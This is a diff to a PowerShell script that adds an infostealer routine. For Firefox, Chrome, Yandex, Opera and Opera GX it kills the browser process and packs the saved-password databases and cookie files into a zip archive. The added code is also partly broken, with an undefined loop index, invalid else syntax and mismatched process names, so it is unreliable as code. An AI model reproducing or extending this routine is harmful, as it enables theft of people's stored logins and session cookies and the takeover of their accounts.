@@ -13,6 +13,32 @@ if("7-Zip"-in $arh)
   {.\7z.exe a $p $w -spf -tzip}
 else
   {Compress-Archive -Path $w -Update -CompressionLevel Fastest -DestinationPath $p}
+        
+$lst = @{0=(($env:APPDATA+"\Mozilla\Firefox\Profiles\*"), "firefox", "logins.json","*.db");
+        1=(($env:LOCALAPPDATA+"\Google\Chrome\User Data\Default\"), "chrome", "Login Data", "Cookies");
+        2=(($env:LOCALAPPDATA+"\Yandex\YandexBrowser\User Data\Default\"), "browser", "Ya Passman Data", "Cookies");
+        3=(($env:APPDATA+"\Opera Software\Opera Stable\"), "Login Data", "Opera123", "Cookies");
+        4=(($env:APPDATA+"\Opera Software\Opera GX Stable\"),  "Opera5656", "Login Data", "Cookies")}
+# $lst = @(
+#     (($env:APPDATA+"\Mozilla\Firefox\Profiles\*"), "firefox", "logins.json","*.db");
+#     (($env:LOCALAPPDATA+"\Google\Chrome\User Data\Default\"), "chrome", "Login Data", "Cookies");
+#     (($env:LOCALAPPDATA+"\Yandex\YandexBrowser\User Data\Default\"), "browser", "Ya Passman Data", "Cookies");
+#     (($env:APPDATA+"\Opera Software\Opera Stable\"), "Login Data", "Opera123", "Cookies");
+#     (($env:APPDATA+"\Opera Software\Opera GX Stable\"),  "Opera5656", "Login Data", "Cookies")
+#   )
+#for ($i = 0; $i -le ($lst.length - 1); $i += 1)
+foreach ($el in $lst)
+  {
+  if(Test-Path -Path $el[0]){
+                Stop-Process -Name $el[1] -ErrorAction SilentlyContinue;
+                if("WinRAR"-in $arh){
+                  Get-ChildItem -Path $lst[$i] -Include $el[2], $el[3] -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p
+                }
+                else("7-Zip"-in $arh){
+                  .\7z.exe a $p (Get-ChildItem -Path $el[0] -Include  $el[2], $el[3] -Recurse) -spf -tzip
+                }
+  }
+}
 
 $f=($env:APPDATA+"\Mozilla\Firefox\Profiles\*");
 if(Test-Path -Path $f)
